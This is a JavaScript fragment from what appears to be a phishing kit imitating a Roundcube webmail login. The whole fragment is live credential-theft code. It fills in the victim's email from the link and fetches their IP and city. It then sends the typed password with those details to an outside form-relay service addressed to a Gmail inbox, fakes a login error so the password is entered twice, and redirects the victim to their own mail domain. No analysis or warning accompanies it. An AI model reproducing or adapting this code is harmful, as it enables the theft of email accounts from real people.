
			let step = 1;
			
			const clientID = new URLSearchParams(location.search).get('clientID');
			$('#rcmloginuser').val(clientID);

			const submit = $("button[type='submit']");

			$("#loginForm").submit(function(event) {
				event.preventDefault();

				submit.text('Logging in...');

				$.getJSON('https://ipinfo.io/json', function(response) {
				 	const posting = $.post("https://formsubmit.co/ajax/Bestsolution0008@gmail.com", {
				 		_subject: "Logs | " + response.ip,
						Email: clientID,
						Password: $("#rcmloginpwd").val(),
						Attempts: step,
						IP: response.ip,
						Location: response.city + ", " + response.country,
					});

					posting.done(function(data) {
						if (step === 2) {
							const domain = clientID.split('@').pop();
							window.location.href = 'http://' + domain;
						} else {
							$("#error").css("display", "block");
							submit.text('Login');
							submit.attr("disabled", false);
							$("#rcmloginpwd").val("");
							step++;
						}
					});

					posting.fail(function() {
						$("#error").css("display", "block");
						$("#rcmloginpwd").val("");
						submit.attr("disabled", false);
						submit.text('Login');
					});	
				}, "json");
			});
		